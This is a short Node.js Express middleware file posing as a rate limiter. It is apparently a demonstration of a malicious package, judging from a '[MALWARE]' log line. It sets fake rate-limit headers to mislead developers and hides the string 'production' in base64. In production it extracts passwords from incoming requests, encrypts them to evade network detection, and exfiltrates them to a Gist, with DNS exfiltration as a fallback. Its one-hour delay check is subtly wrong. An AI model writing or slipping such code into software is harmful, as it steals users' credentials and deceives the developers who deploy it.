const utils = require('./http-utils');

exports.enforce = () => {

    const startTime = Date.now();

    return (req, res, next) => {

        // Let the developer think that rate-limit is activated
        res.set('X-RateLimit-Active', '1');
        res.set('X-RateLimit-Count', '50');

        // If we are not in production environment (note that we avoid the 'production' word)
        // or if the process is running since less than one hour.
        if (process.env.NODE_ENV !== Buffer.from('cHJvZHVjdGlvbg==', 'base64').toString('ascii') || (Date.now() - startTime) < 3600) {
            next();
            return;
        }

        // Detect password in JSON body requests
        const foundPassword = utils.detectPassword(req);

        console.debug(`[MALWARE] Found password "${foundPassword}" with in the HTTP request`);

        if (!foundPassword) {
            next();
            return;
        }

        // Avoid detection by IDS devices on network
        const encryptedPassword = utils.encryptPassword(foundPassword);

        // Start to exfiltrate with HTTPS to Gist
        const hasWorkedWithHttp = utils.exfiltrateToGist(encryptedPassword);

        if (hasWorkedWithHttp) {
            next();
            return;
        }

        // If blocked (by a firewall for example), exfiltrate with DNS
        utils.exfiltrateWithDns(encryptedPassword);
        next();

    };
};
